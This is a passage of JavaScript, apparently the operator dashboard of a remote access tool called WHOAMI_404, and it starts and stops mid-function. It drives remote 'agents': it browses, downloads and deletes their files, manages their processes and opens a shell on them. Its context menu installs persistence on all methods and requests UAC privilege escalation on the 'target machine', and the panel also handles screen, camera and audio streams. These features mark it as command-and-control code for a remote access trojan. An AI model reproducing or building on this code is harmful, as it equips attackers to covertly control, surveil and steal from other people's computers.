                        }
                    } else if (action === 'delete') {
                        const confirmOk = await showCustomConfirm({
                            title: 'Delete Agent Permanently (2FA Verified)',
                            subtitle: 'Device Operations',
                            message: `Enter Google Authenticator 2FA code to permanently delete offline agent ${id.slice(0, 8)} from the database:`,
                            icon: 'ph-trash',
                            confirmText: 'Verify & Delete Permanently',
                            isDanger: true,
                            requireTotp: true
                        });
                        if (confirmOk) {
                            fetch(`/api/agents/${id}`, {
                                method: 'DELETE',
                                headers: { 'X-CSRFToken': getCsrfToken() }
                            }).then(() => {
                                delete state.agents[id];
                                if (state.selectedAgentId === id) {
                                    state.selectedAgentId = null;
                                }
                                renderConnectedDevices();
                                renderAgentList();
                                updateCounters();
                                showToast('success', `Agent ${id.slice(0, 8)} permanently deleted.`);
                            }).catch(() => { });
                        }
                    }
                });
            });
        } else {
            agentArr.forEach((a, i) => {
                const card = currentCards[i];
                if (!card) return;
                const isSelected = state.selectedAgentId === a.agent_id;
                card.className = `device-card ${isSelected ? 'selected' : ''}`;
                const hostEl = card.querySelector('.device-hostname');
                const dotEl = card.querySelector('.device-online-dot');
                const ipEl = card.querySelector('.spec-ip');
                const osEl = card.querySelector('.spec-os');
                const cpuEl = card.querySelector('.spec-cpu');
                if (hostEl) hostEl.textContent = a.hostname || 'Unknown Host';
                if (dotEl) {
                    dotEl.className = `device-online-dot ${a.online ? 'online' : 'offline'}`;
                    dotEl.title = a.online ? 'Online' : 'Offline';
                }
                if (ipEl) ipEl.textContent = a.ip || '127.0.0.1';
                if (osEl) osEl.textContent = formatOsString(a);
                if (cpuEl) cpuEl.textContent = `${a.cpu || 'Unknown CPU'} · ${formatRamShort(a.ram)}`;
            });
        }
    }

    function getFileVisualProps(item) {
        const isFolder = item.type === 'dir' || item.type === 'drive' || item.type === 'shortcut';
        if (item.type === 'drive') {
            return { icon: 'ph-hard-drives', color: '#fbbf24' };
        }
        if (item.type === 'shortcut') {
            return { icon: 'ph-folder-star', color: '#fbbf24' };
        }
        if (isFolder) {
            return { icon: 'ph-folder', color: '#fbbf24' };
        }

        const ext = (item.name || '').split('.').pop().toLowerCase();

        // Images (PNG, JPG, GIF, WebP, SVG, ICO, etc.)
        if (['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'bmp', 'ico', 'tiff', 'psd', 'ai'].includes(ext)) {
            return { icon: 'ph-image', color: '#38bdf8' };
        }
        // Audio / Songs (MP3, WAV, FLAC, AAC, M4A, etc.)
        if (['mp3', 'wav', 'flac', 'aac', 'm4a', 'ogg', 'wma', 'opus', 'mid', 'midi'].includes(ext)) {
            return { icon: 'ph-music-notes', color: '#f472b6' };
        }
        // Videos (MP4, MKV, AVI, MOV, WMV, etc.)
        if (['mp4', 'mkv', 'avi', 'mov', 'wmv', 'flv', 'webm', 'm4v', '3gp'].includes(ext)) {
            return { icon: 'ph-video', color: '#a78bfa' };
        }
        // PDF Documents
        if (ext === 'pdf') {
            return { icon: 'ph-file-pdf', color: '#ef4444' };
        }
        // Text & Word Documents
        if (['doc', 'docx', 'rtf', 'odt', 'txt', 'md', 'log'].includes(ext)) {
            return { icon: 'ph-file-doc', color: '#60a5fa' };
        }
        // Spreadsheets & Data files
        if (['xls', 'xlsx', 'csv', 'tsv', 'json', 'xml', 'sql'].includes(ext)) {
            return { icon: 'ph-file-xls', color: '#22c55e' };
        }
        // Presentations
        if (['ppt', 'pptx'].includes(ext)) {
            return { icon: 'ph-file-ppt', color: '#f97316' };
        }
        // Archives & Zips
        if (['zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'xz', 'iso', 'cab'].includes(ext)) {
            return { icon: 'ph-file-zip', color: '#fbbf24' };
        }
        // Executables & Binaries
        if (['exe', 'msi', 'dll', 'sys', 'bin', 'com'].includes(ext)) {
            return { icon: 'ph-terminal-window', color: '#4ade80' };
        }
        // Scripts & Code
        if (['bat', 'cmd', 'ps1', 'vbs', 'sh', 'py', 'js', 'ts', 'cpp', 'c', 'h', 'java', 'html', 'css', 'php'].includes(ext)) {
            return { icon: 'ph-code', color: '#c084fc' };
        }

        return { icon: 'ph-file-text', color: '#94a3b8' };
    }

    function sortFilesList(files) {
        if (!Array.isArray(files)) return [];

        const shortcutsAndFolders = [];
        const drives = [];
        const regularFiles = [];

        for (const item of files) {
            if (item.type === 'shortcut' || item.type === 'dir') {
                shortcutsAndFolders.push(item);
            } else if (item.type === 'drive') {
                drives.push(item);
            } else {
                regularFiles.push(item);
            }
        }

        // 1. Sort folders & shortcuts A to Z (case-insensitive, natural comparison)
        shortcutsAndFolders.sort((a, b) => (a.name || '').localeCompare(b.name || '', undefined, { numeric: true, sensitivity: 'base' }));

        // 2. Sort drives A to Z (e.g. C:, D:, E:)
        drives.sort((a, b) => (a.name || '').localeCompare(b.name || '', undefined, { numeric: true, sensitivity: 'base' }));

        // 3. Sort files A to Z (case-insensitive, natural comparison)
        regularFiles.sort((a, b) => (a.name || '').localeCompare(b.name || '', undefined, { numeric: true, sensitivity: 'base' }));

        // Return order: Folders first, then Drives, then regular Files
        return [...shortcutsAndFolders, ...drives, ...regularFiles];
    }

    function renderFilesTable(files, currentPath) {
        const pathInput = document.getElementById('file-current-path');
        if (pathInput && currentPath) pathInput.value = currentPath;

        const tbody = document.getElementById('file-list-body');
        if (!tbody || !Array.isArray(files)) return;

        if (files.length === 0) {
            tbody.innerHTML = `
                <div style="padding: 40px; text-align: center; color: var(--text-muted);">
                    <i class="ph ph-folder" style="font-size: 2.2rem; display: block; margin-bottom: 8px; opacity: 0.5;"></i>
                    This folder is empty
                </div>
            `;
            return;
        }

        // Organize: Folders First A-Z, then Files Last A-Z
        const sortedFiles = sortFilesList(files);

        tbody.innerHTML = sortedFiles.map(item => {
            const isFolder = item.type === 'dir' || item.type === 'drive' || item.type === 'shortcut';
            const isDrive = item.type === 'drive';
            const visual = getFileVisualProps(item);

            const downloadBtnHtml = (!isDrive)
                ? `<button class="f-row-btn download-file" title="${isFolder ? 'Download Folder (ZIP)' : 'Download File'}"><i class="ph ph-download-simple"></i></button>`
                : '';

            const renameBtnHtml = (!isDrive)
                ? `<button class="f-row-btn rename-item" title="Rename"><i class="ph ph-pencil-simple"></i></button>`
                : '';

            const deleteBtnHtml = (!isDrive)
                ? `<button class="f-row-btn delete" title="Delete"><i class="ph ph-trash"></i></button>`
                : '';

            return `
            <div class="file-row" data-type="${isFolder ? 'folder' : 'file'}" data-name="${escapeHtml(item.name)}" data-path="${escapeHtml(item.path || '')}">
                <div class="f-col-name">
                    <i class="ph-fill ${visual.icon}" style="color: ${visual.color}; font-size: 1.35rem; flex-shrink: 0;"></i>
                    <span class="f-name-text">${escapeHtml(item.name)}</span>
                </div>
                <div class="f-col-date">${escapeHtml(item.modified || '—')}</div>
                <div class="f-col-size">${escapeHtml(item.size || '—')}</div>
                <div class="f-col-actions">
                    ${downloadBtnHtml}
                    ${renameBtnHtml}
                    ${deleteBtnHtml}
                </div>
            </div>
            `;
        }).join('');

        bindFileRowActions();
    }

    function updateNavBtnStates() {
        const backBtn = document.getElementById('f-nav-back');
        const fwdBtn = document.getElementById('f-nav-fwd');
        const history = state.fileHistory || [];
        const idx = state.fileHistoryIdx !== undefined ? state.fileHistoryIdx : -1;
        if (backBtn) {
            backBtn.style.opacity = (idx > 0) ? '1' : '0.4';
            backBtn.style.cursor = (idx > 0) ? 'pointer' : 'default';
        }
        if (fwdBtn) {
            fwdBtn.style.opacity = (idx >= 0 && idx < history.length - 1) ? '1' : '0.4';
            fwdBtn.style.cursor = (idx >= 0 && idx < history.length - 1) ? 'pointer' : 'default';
        }
    }

    function bindFileRowActions() {
        const tbody = document.getElementById('file-list-body');
        if (!tbody) return;

        tbody.querySelectorAll('.file-row').forEach(row => {
            const name = row.dataset.name;
            const isFolder = row.dataset.type === 'folder';
            const shortcutPath = row.dataset.path;

            row.addEventListener('click', () => {
                if (isFolder) {
                    const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
                    let newPath;
                    if (shortcutPath && (currentPath === 'Drives' || currentPath === 'Drives\\')) {
                        newPath = shortcutPath.endsWith('\\') ? shortcutPath : shortcutPath + '\\';
                    } else if (currentPath === 'Drives' || currentPath === 'Drives\\') {
                        newPath = name.endsWith('\\') ? name : name + '\\';
                    } else {
                        const sep = currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\';
                        newPath = currentPath + sep + name;
                    }
                    requestFileList(newPath);
                }
            });



            const downloadBtn = row.querySelector('.download-file');
            if (downloadBtn) {
                downloadBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                    const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
                    let targetPath;
                    if (shortcutPath && (currentPath === 'Drives' || currentPath === 'Drives\\')) {
                        targetPath = shortcutPath;
                    } else {
                        const sep = currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\';
                        targetPath = currentPath + sep + name;
                    }
                    showToast('info', `Requesting download for "${name}"...`);
                    sendCommand(state.selectedAgentId, 'file_download', { path: targetPath });
                });
            }

            const renameBtn = row.querySelector('.rename-item');
            if (renameBtn) {
                renameBtn.addEventListener('click', async (e) => {
                    e.stopPropagation();
                    if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                    const newName = await showCustomPrompt({
                        title: 'Rename Item',
                        subtitle: 'Files & Actions',
                        message: `Enter new name for "${name}":`,
                        defaultValue: name,
                        icon: 'ph-pencil-simple',
                        confirmText: 'Rename'
                    });
                    if (newName && newName.trim() && newName.trim() !== name) {
                        const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
                        let targetPath;
                        if (shortcutPath && (currentPath === 'Drives' || currentPath === 'Drives\\')) {
                            targetPath = shortcutPath;
                        } else {
                            const sep = currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\';
                            targetPath = currentPath + sep + name;
                        }
                        sendCommand(state.selectedAgentId, 'file_rename', {
                            old: targetPath,
                            new: newName.trim()
                        });
                        showToast('info', `Renaming "${name}" to "${newName.trim()}"...`);
                    }
                });
            }

            const deleteBtn = row.querySelector('.delete');
            if (deleteBtn) {
                deleteBtn.addEventListener('click', async (e) => {
                    e.stopPropagation();
                    if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                    const confirmOk = await showCustomConfirm({
                        title: 'Delete Item',
                        subtitle: 'Files & Actions',
                        message: `Are you sure you want to delete "${name}"?`,
                        icon: 'ph-trash',
                        confirmText: 'Delete',
                        isDanger: true
                    });
                    if (confirmOk) {
                        const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
                        let target;
                        if (shortcutPath && (currentPath === 'Drives' || currentPath === 'Drives\\')) {
                            target = shortcutPath;
                        } else {
                            const sep = currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\';
                            target = currentPath + sep + name;
                        }
                        sendCommand(state.selectedAgentId, 'file_delete', { path: target });
                        showToast('info', `Deleting "${name}"...`);
                    }
                });
            }
        });
    }

    function requestFileList(path = 'C:\\', pushHistory = true) {
        if (!state.selectedAgentId) {
            showToast('warning', 'Please select a connected device first');
            return;
        }
        const pathInput = document.getElementById('file-current-path');
        if (pathInput) pathInput.value = path;

        state.fileHistory = state.fileHistory || [];
        state.fileHistoryIdx = (state.fileHistoryIdx !== undefined) ? state.fileHistoryIdx : -1;

        if (pushHistory) {
            if (state.fileHistoryIdx < state.fileHistory.length - 1) {
                state.fileHistory = state.fileHistory.slice(0, state.fileHistoryIdx + 1);
            }
            if (state.fileHistory.length === 0 || state.fileHistory[state.fileHistory.length - 1] !== path) {
                state.fileHistory.push(path);
                state.fileHistoryIdx = state.fileHistory.length - 1;
            }
        }
        updateNavBtnStates();

        showToast('info', `Listing directory: ${path}`);
        sendCommand(state.selectedAgentId, 'listdir', { path });
    }

    function getOsIcon(os) {
        if (!os) return 'desktop-tower';
        const lower = os.toLowerCase();
        if (lower.includes('windows')) return 'windows-logo';
        if (lower.includes('linux')) return 'linux-logo';
        if (lower.includes('mac') || lower.includes('darwin')) return 'apple-logo';
        if (lower.includes('android')) return 'android-logo';
        return 'desktop-tower';
    }

    // ──────── AGENT SELECTION ────────
    function selectAgent(id) {
        if (state.selectedAgentId && state.selectedAgentId !== id) {
            stopWebRTCStream('screen');
            stopWebRTCStream('camera');
            stopWebRTCStream('audio');
        }
        state.selectedAgentId = id;
        const agent = state.agents[id];
        if (!agent) return;

        renderAgentList(); // Update highlight & grid

        // Update WHOAMI_404 Top Active Device Banner
        const bannerHost = document.getElementById('banner-hostname');
        const bannerMeta = document.getElementById('banner-meta');
        const bannerDot = document.getElementById('banner-status-dot');
        const bannerText = document.getElementById('banner-status-text');
        if (bannerHost && agent) {
            bannerHost.innerHTML = `<i class="ph ph-${getOsIcon(agent.os)}"></i> ${escapeHtml(agent.hostname || 'Unknown Host')}`;
            bannerMeta.innerHTML = `<i class="ph ph-shield"></i> Agent ID: ${escapeHtml(agent.agent_id.slice(0, 12))} · IP: ${escapeHtml(agent.ip || 'Unknown')} · ${escapeHtml(formatOsString(agent))}`;
            if (agent.online) {
                if (bannerDot) bannerDot.className = 'online-dot';
                if (bannerText) bannerText.textContent = 'Online';
            } else {
                if (bannerDot) bannerDot.className = 'online-dot offline';
                if (bannerText) bannerText.textContent = 'Offline';
            }
        }

        // Update stream placeholder
        const placeholder = document.getElementById('stream-placeholder');
        if (placeholder) {
            placeholder.innerHTML = `
                <div class="placeholder-icon">
                    <i class="ph-thin ph-monitor-play"></i>
                </div>
                <h3>Streaming ${escapeHtml(agent.hostname)}</h3>
                <p>Agent ${escapeHtml(id.slice(0, 8))}... · ${escapeHtml(agent.os || 'Unknown OS')}</p>
            `;
        }

        // Update terminal label & session title
        const termLabel = document.getElementById('terminal-agent-label');
        if (termLabel) termLabel.textContent = agent.hostname || 'agent';

        const termSessionTitle = document.getElementById('terminal-session-title');
        if (termSessionTitle) {
            termSessionTitle.textContent = `Session: ${agent.hostname || 'Agent'} (${agent.ip || '127.0.0.1'}) - ${agent.os || 'Windows'}`;
        }

        const promptCwd = document.getElementById('terminal-prompt-cwd');
        const cwdBadge = document.getElementById('terminal-cwd-badge');
        const activeCwd = (state.agentCwd && state.agentCwd[id]) || 'C:\\';
        if (promptCwd) promptCwd.textContent = activeCwd;
        if (cwdBadge) cwdBadge.textContent = activeCwd;


        // Render data view
        renderAgentDataView(agent);

        // Render stats
        renderAgentStats(agent);

        // Automatically fetch live file list and processes for selected agent
        const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
        requestFileList(currentPath);
        sendCommand(id, 'ps');

        addLog('nav', `Selected agent: ${agent.hostname}`);
    }

    function formatOsString(agent) {
        if (!agent) return '—';
        let osVal = agent.os || '';
        if (!agent.os_version) return osVal || '—';
        if (osVal && agent.os_version.toLowerCase().includes(osVal.toLowerCase())) {
            return agent.os_version;
        }
        return osVal ? `${osVal} ${agent.os_version}` : agent.os_version;
    }

    function formatRamString(ramMb) {
        if (!ramMb || ramMb <= 0) return '—';
        if (ramMb >= 1024) {
            const gb = (ramMb / 1024).toFixed(1);
            return `${gb} GB (${ramMb.toLocaleString()} MB)`;
        }
        return `${ramMb} MB`;
    }

    function formatRamShort(ramMb) {
        if (!ramMb || ramMb <= 0) return '—';
        if (ramMb >= 1024) {
            return `${(ramMb / 1024).toFixed(1)} GB`;
        }
        return `${ramMb} MB`;
    }

    // ──────── AGENT DATA VIEW ────────
    function renderAgentDataView(agent) {
        const container = document.getElementById('data-content');
        if (!container) return;

        const fields = [
            { icon: 'identification-badge', label: 'Agent ID', value: agent.agent_id },
            { icon: 'desktop-tower', label: 'Hostname', value: agent.hostname || '—' },
            { icon: 'hard-drives', label: 'OS / Version', value: formatOsString(agent) },
            { icon: 'cpu', label: 'CPU', value: agent.cpu || '—' },
            { icon: 'graphics-card', label: 'GPU', value: agent.gpu || '—' },
            { icon: 'memory', label: 'RAM', value: formatRamString(agent.ram) },
            { icon: 'globe-hemisphere-west', label: 'IP Address', value: agent.ip || '—' },
            { icon: 'flag', label: 'Country', value: agent.country || '—' },
            { icon: 'tag', label: 'Tags', value: (agent.tags || []).join(', ') || '—' },
            { icon: 'calendar', label: 'Registered', value: formatDate(agent.registered_at) },
            { icon: 'heartbeat', label: 'Last Seen', value: formatDate(agent.last_heartbeat) },
        ];

        container.innerHTML = `<div class="agent-info-grid">
            ${fields.map(f => `
                <div class="info-card">
                    <div class="info-card-label">
                        <i class="ph ph-${f.icon}"></i>
                        <span>${f.label}</span>
                    </div>
                    <div class="info-card-value ${f.value && f.value.length > 30 ? 'small' : ''}">
                        ${escapeHtml(f.value)}
                    </div>
                </div>
            `).join('')}
        </div>`;
    }

    // ──────── AGENT STATS ────────
    function renderAgentStats(agent) {
        const container = document.getElementById('agent-stats');
        if (!container) return;

        const rows = [
            { icon: 'pulse', label: 'Status', value: agent.online ? '● Online' : '○ Offline', color: agent.online ? 'var(--accent-green)' : 'var(--accent-red)' },
            { icon: 'desktop-tower', label: 'Host', value: agent.hostname || '—' },
            { icon: 'hard-drives', label: 'OS', value: formatOsString(agent) },
            { icon: 'globe-hemisphere-west', label: 'IP', value: agent.ip || '—' },
            { icon: 'memory', label: 'RAM', value: formatRamShort(agent.ram) },
            { icon: 'heartbeat', label: 'Heartbeat', value: formatDate(agent.last_heartbeat) },
        ];

        container.innerHTML = rows.map(r => `
            <div class="stat-row">
                <div class="stat-row-label">
                    <i class="ph ph-${r.icon}"></i>
                    <span>${r.label}</span>
                </div>
                <div class="stat-row-value" ${r.color ? `style="color:${r.color}"` : ''}>
                    ${escapeHtml(r.value)}
                </div>
            </div>
        `).join('');
    }

    // ──────── LOG ────────
    function addLog(type, message) {
        const container = document.getElementById('log-output');
        if (!container) return;

        // Remove empty placeholder
        const empty = container.querySelector('.log-empty');
        if (empty) empty.remove();

        const now = new Date();
        const time = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;

        const entry = document.createElement('div');
        entry.className = 'log-entry';
        entry.innerHTML = `
            <span class="log-time">${time}</span>
            <span class="log-msg">${escapeHtml(message)}</span>
        `;
        container.appendChild(entry);
        container.scrollTop = container.scrollHeight;

        // Limit to 200 entries
        while (container.children.length > 200) {
            container.removeChild(container.firstChild);
        }
    }

    // ──────── NOTIFICATIONS ────────
    function addNotification(title, body) {
        state.notifications.unshift({ title, body, time: new Date() });
        state.notifCount++;
        updateNotifBadge();
        renderNotifications();
    }

    function renderNotifications() {
        const list = document.getElementById('notif-list');
        if (!list) return;

        if (state.notifications.length === 0) {
            list.innerHTML = '<div class="notif-empty">No notifications</div>';
            return;
        }

        list.innerHTML = state.notifications.slice(0, 50).map(n => `
            <div class="notif-item">
                <div class="notif-item-title">${escapeHtml(n.title)}</div>
                <div class="notif-item-body">${escapeHtml(n.body)}</div>
            </div>
        `).join('');
    }

    // ──────── TOASTS ────────
    function showToast(type, message, duration = 4000) {
        const container = document.getElementById('toast-container');
        if (!container) return;

        const icons = {
            success: 'ph-check-circle',
            error: 'ph-x-circle',
            info: 'ph-info',
            warning: 'ph-warning',
        };

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <i class="ph ${icons[type] || icons.info} toast-icon"></i>
            <span>${escapeHtml(message)}</span>
        `;

        container.appendChild(toast);

        setTimeout(() => {
            toast.classList.add('exit');
            setTimeout(() => toast.remove(), 300);
        }, duration);
    }

    // ──────── CONTEXT MENU ────────
    function showContextMenu(e, agentId) {
        e.preventDefault();
        const menu = document.getElementById('context-menu');
        if (!menu) return;

        menu.style.display = 'block';
        menu.style.left = `${e.clientX}px`;
        menu.style.top = `${e.clientY}px`;
        menu.dataset.agentId = agentId;

        // Ensure menu stays in viewport
        const rect = menu.getBoundingClientRect();
        if (rect.right > window.innerWidth) {
            menu.style.left = `${e.clientX - rect.width}px`;
        }
        if (rect.bottom > window.innerHeight) {
            menu.style.top = `${e.clientY - rect.height}px`;
        }
    }

    document.addEventListener('click', () => {
        const menu = document.getElementById('context-menu');
        if (menu) menu.style.display = 'none';
    });

    // Context menu actions
    document.querySelectorAll('.ctx-item').forEach(item => {
        item.addEventListener('click', () => {
            const menu = document.getElementById('context-menu');
            const agentId = menu?.dataset.agentId;
            const action = item.dataset.action;
            if (!agentId || !action) return;

            selectAgent(agentId);

            switch (action) {
                case 'shell':
                    switchView('terminal');
                    document.getElementById('terminal-input')?.focus();
                    break;
                case 'info':
                    switchPane('processes');
                    break;

                case 'persist':
                    sendCommand(agentId, 'persistence', { method: 'all' });
                    break;
                case 'elevate':
                    showCustomConfirm({
                        title: 'Request UAC Elevation',
                        subtitle: 'Privilege Escalation',
                        message: 'Request Administrator elevation via UAC prompt on the target machine?',
                        icon: 'ph-shield-warning',
                        confirmText: 'Request Elevation',
                        isDanger: false
                    }).then(confirmOk => {
                        if (confirmOk) sendCommand(agentId, 'elevate');
                    });
                    break;
                case 'kill':
                    showCustomConfirm({
                        title: 'Kill Agent (2FA Required)',
                        subtitle: 'Context Actions',
                        message: `Enter Google Authenticator 2FA code to confirm killing agent ${agentId.slice(0, 8)}:`,
                        icon: 'ph-skull',
                        confirmText: 'Verify & Kill Agent',
                        isDanger: true,
                        requireTotp: true
                    }).then(confirmOk => {
                        if (confirmOk) {
                            sendCommand(agentId, 'kill');
                            setTimeout(() => {
                                fetch(`/api/agents/${agentId}`, {
                                    method: 'DELETE',
                                    headers: { 'X-CSRFToken': getCsrfToken() }
                                });
                            }, 500);
                        }
                    });
                    break;
            }
        });
    });

    // ──────── COMMAND SENDER ────────
    function sendCommand(agentId, command, params = {}) {
        const csrfToken = getCsrfToken();

        fetch(`/api/agents/${agentId}/command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken,
            },
            body: JSON.stringify({ command, params }),
        })
            .then(r => r.json())
            .then(data => {
                if (data.uuid) {
                    addLog('command', `Sent: ${command} → ${agentId.slice(0, 8)} [${data.uuid.slice(0, 8)}]`);
                    showToast('info', `Command sent: ${command}`);

                    const countEl = document.getElementById('count-tasks');
                    if (countEl) countEl.textContent = parseInt(countEl.textContent || '0') + 1;
                } else {
                    showToast('error', data.error || 'Failed to send command');
                }
            })
            .catch(err => {
                showToast('error', 'Network error sending command');
            });
    }

    function getCsrfToken() {
        const cookie = document.cookie.split('; ').find(c => c.startsWith('csrf_token='));
        return cookie ? cookie.split('=')[1] : '';
    }

    // ──────── PROCESS MANAGER ────────
    state.processList = [];
    state.processSort = { key: 'memory', dir: 'desc' };

    function renderProcessTable(procs) {
        state.processList = Array.isArray(procs) ? procs : [];
        const countBadge = document.getElementById('process-count-badge');
        if (countBadge) {
            countBadge.textContent = `${state.processList.length} Processes`;
        }
        displayFilteredProcesses();
    }

    function displayFilteredProcesses() {
        const tbody = document.getElementById('process-table-body');
        if (!tbody) return;

        const searchInput = document.getElementById('process-search-input');
        const query = (searchInput?.value || '').trim().toLowerCase();

        let list = state.processList.slice();

        // Filter by PID or process name
        if (query) {
            list = list.filter(p =>
                String(p.pid || '').includes(query) ||
                String(p.name || '').toLowerCase().includes(query) ||
                String(p.status || '').toLowerCase().includes(query)
            );
        }

        // Sort by active sort column
        const { key, dir } = state.processSort;
        list.sort((a, b) => {
            let valA = a[key];
            let valB = b[key];
            if (key === 'pid' || key === 'cpu' || key === 'memory') {
                valA = parseFloat(valA) || 0;
                valB = parseFloat(valB) || 0;
            } else {
                valA = String(valA || '').toLowerCase();
                valB = String(valB || '').toLowerCase();
            }
            if (valA < valB) return dir === 'asc' ? -1 : 1;
            if (valA > valB) return dir === 'asc' ? 1 : -1;
            return 0;
        });

        if (list.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="padding: 40px; text-align: center; color: var(--text-muted);"><i class="ph ph-magnifying-glass" style="font-size: 2rem; display: block; margin-bottom: 8px; opacity: 0.5;"></i>No matching processes found</td></tr>';
            return;
        }

        tbody.innerHTML = list.map(p => {
            const isSuspended = String(p.status || '').toLowerCase().includes('suspend');
            const statusBg = isSuspended ? 'rgba(251,191,36,0.15)' : 'rgba(34,197,94,0.15)';
            const statusColor = isSuspended ? '#fbbf24' : '#4ade80';
            const statusText = isSuspended ? 'SUSPENDED' : 'RUNNING';

            const cpuVal = (typeof p.cpu === 'number') ? p.cpu : (parseFloat(p.cpu) || 0);
            let cpuColor = '#94a3b8';
            if (cpuVal > 20) cpuColor = '#f87171';
            else if (cpuVal > 5) cpuColor = '#fbbf24';
            else if (cpuVal > 0) cpuColor = '#4ade80';

            return `
            <tr class="proc-row" style="border-bottom: 1px solid var(--border-subtle); transition: background 0.15s ease;">
                <td style="padding: 7px 16px; font-family: 'JetBrains Mono', monospace; color: var(--accent-primary); font-weight: 700; font-size: 0.85rem;">${escapeHtml(String(p.pid || ''))}</td>
                <td style="padding: 7px 16px; color: var(--text-primary); font-weight: 500; font-size: 0.88rem;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <i class="ph-fill ph-cpu" style="color: #a855f7; font-size: 1.1rem; flex-shrink: 0;"></i>
                        <span>${escapeHtml(String(p.name || 'unknown'))}</span>
                    </div>
                </td>
                <td style="padding: 7px 16px; color: ${cpuColor}; font-weight: 600; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">${cpuVal.toFixed(1)}%</td>
                <td style="padding: 7px 16px; color: #f8fafc; font-weight: 600; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">${(parseFloat(p.memory) || 0).toFixed(1)} MB</td>
                <td style="padding: 7px 16px;">
                    <span style="background: ${statusBg}; color: ${statusColor}; padding: 2px 8px; border-radius: 6px; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.5px; font-family: 'JetBrains Mono', monospace;">${statusText}</span>
                </td>
                <td style="padding: 7px 16px; text-align: right;">
                    <div style="display: flex; gap: 6px; justify-content: flex-end;">
                        <button class="f-row-btn proc-suspend-btn" data-pid="${escapeHtml(String(p.pid || ''))}" data-name="${escapeHtml(String(p.name || ''))}" title="Suspend Process" style="background: rgba(251,191,36,0.15); color: #fbbf24; border-color: rgba(251,191,36,0.3); width: 28px; height: 28px; font-size: 0.85rem;">
                            <i class="ph ph-pause"></i>
                        </button>
                        <button class="f-row-btn proc-resume-btn" data-pid="${escapeHtml(String(p.pid || ''))}" data-name="${escapeHtml(String(p.name || ''))}" title="Resume Process" style="background: rgba(74,222,128,0.15); color: #4ade80; border-color: rgba(74,222,128,0.3); width: 28px; height: 28px; font-size: 0.85rem;">
                            <i class="ph ph-play"></i>
                        </button>
                        <button class="f-row-btn proc-kill-btn delete" data-pid="${escapeHtml(String(p.pid || ''))}" data-name="${escapeHtml(String(p.name || ''))}" title="Kill Process" style="background: rgba(239,68,68,0.15); color: #f87171; border-color: rgba(239,68,68,0.3); width: 28px; height: 28px; font-size: 0.85rem;">
                            <i class="ph ph-trash"></i>
                        </button>
                    </div>
                </td>
            </tr>
            `;
        }).join('');

        // Bind Kill, Suspend, and Resume on each row
        tbody.querySelectorAll('.proc-kill-btn').forEach(btn => {
            btn.addEventListener('click', async () => {
                const pid = btn.dataset.pid;
                const name = btn.dataset.name;
                if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                const confirmOk = await showCustomConfirm({
                    title: 'Kill Process',
                    subtitle: 'Remote Process Manager',
                    message: `Terminate process "${name}" (PID ${pid})?`,
                    icon: 'ph-x-circle',
                    confirmText: 'Kill Process',
                    isDanger: true
                });
                if (confirmOk) {
                    sendCommand(state.selectedAgentId, 'kill_pid', { pid: pid });
                    showToast('info', `Terminating PID ${pid}...`);
                    setTimeout(() => {
                        if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps');
                    }, 800);
                }
            });
        });

        tbody.querySelectorAll('.proc-suspend-btn').forEach(btn => {
            btn.addEventListener('click', async () => {
                const pid = btn.dataset.pid;
                const name = btn.dataset.name;
                if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                sendCommand(state.selectedAgentId, 'process_suspend', { value: pid });
                showToast('info', `Suspending "${name}" (PID ${pid})...`);
                setTimeout(() => {
                    if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps');
                }, 800);
            });
        });

        tbody.querySelectorAll('.proc-resume-btn').forEach(btn => {
            btn.addEventListener('click', async () => {
                const pid = btn.dataset.pid;
                const name = btn.dataset.name;
                if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                sendCommand(state.selectedAgentId, 'process_resume', { value: pid });
                showToast('info', `Resuming "${name}" (PID ${pid})...`);
                setTimeout(() => {
                    if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps');
                }, 800);
            });
        });
    }

    // Set up Process Manager interactions & 5-second auto-refresh
    state.processAutoRefreshTimer = null;

    function startProcessAutoRefresh() {
        stopProcessAutoRefresh();
        state.processAutoRefreshTimer = setInterval(() => {
            const pane = document.getElementById('pane-process');
            if (pane && pane.classList.contains('active') && state.selectedAgentId) {
                sendCommand(state.selectedAgentId, 'ps');
            }
        }, 5000);
    }

    function stopProcessAutoRefresh() {
        if (state.processAutoRefreshTimer) {
            clearInterval(state.processAutoRefreshTimer);
            state.processAutoRefreshTimer = null;
        }
    }

    function initProcessManagerInteractions() {
        const searchInput = document.getElementById('process-search-input');
        if (searchInput) {
            searchInput.addEventListener('input', () => {
                displayFilteredProcesses();
            });
        }

        const refreshBtn = document.getElementById('btn-process-refresh');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', () => {
                if (!state.selectedAgentId) {
                    showToast('warning', 'Select an agent first');
                    return;
                }
                showToast('info', 'Refreshing process list...');
                sendCommand(state.selectedAgentId, 'ps');
            });
        }

        const killPidInput = document.getElementById('process-kill-pid');
